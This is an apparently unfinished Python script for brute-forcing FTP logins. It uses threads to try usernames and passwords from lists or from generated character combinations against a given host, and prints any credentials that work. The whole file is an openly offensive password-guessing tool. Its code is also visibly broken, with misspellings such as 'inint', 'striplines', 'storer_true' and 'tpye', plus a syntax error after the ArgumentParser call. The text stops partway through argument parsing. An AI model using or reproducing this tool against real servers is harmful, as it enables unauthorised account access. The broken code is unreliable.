import ftplib
from threading import Thread
import queue
from colorama import inint, Fore
import sys 
import argparse
import itertools
import string

q = queue.Queue()

def connect_ftp(host, port):
    global q
    while True:
        user, password = q.get()
        try:
            with ftplib.FTP() as server:
                print(f'[!] Trying: {password}')
                server.connect(host, port, timeout=5)
                server.login(user, password)
                print(f"{Fore.GREEN}[+] Found Credentials: ")
                print(f"\tHost: {host}")
                print(f"\tUser: {user}")
                print(f'\tPassword: {password}{Fore.RESET}')

                #Clear the queue
                with q.mutex:
                    q.queue.clear()
                    q.all_tasks_done.notify_all()
                    q.unfinished_tasks = 0
        except ftplib.error_perm:
            pass
        except Exception as e:
            print(f"{Fore.RED}[-] Error: {str(e)}")
        finally:
            q.task_done()

def load_lines(file_path):
    with open(file_path, 'r') as file:
        lines = file.read().striplines()
    return lines

def generate_passwords(min_length, max_length, chars):
    for length in range(min_length, max_length + 1):
        for password in itertools.product(chars, repeat=length):
            yield ''.join(password)

def main():
    parser = argparse.ArgumentParser(description="FTP Brute Force."):
    parser.add_argument('--host', type=str, required=True, help='FTP server host or IP.')
    parser.add_argument('--port', type=int, default=21, help='FTP server port. Default is 21.')
    parser.add_argument('-t', '--threads', type=int, default=3, help='Number of threads to use.')
    parser.add_argument('-u', '--user', type=str, help='A single username.')
    parser.add_argument('-U', '--userlist', type=str, help='Path to username list.')
    parser.add_argument('-w', '--wordlist', type=str, help='Path to passwords list.')
    parser.add_argument('-g', '--generate', action='storer_true', help='Generate passwords on the fly.')
    parser.add_argument('--min_length', type=int, help='Minimum length for password generation.', default=1)
    parser.add_argument('--max_length', type=int, help='Maximum length for password generation.', default=4)
    parser.add_argument('-c', '--chars', tpye=str, help='Characters to use for password generation', default=string.ascii_letters + string.digits)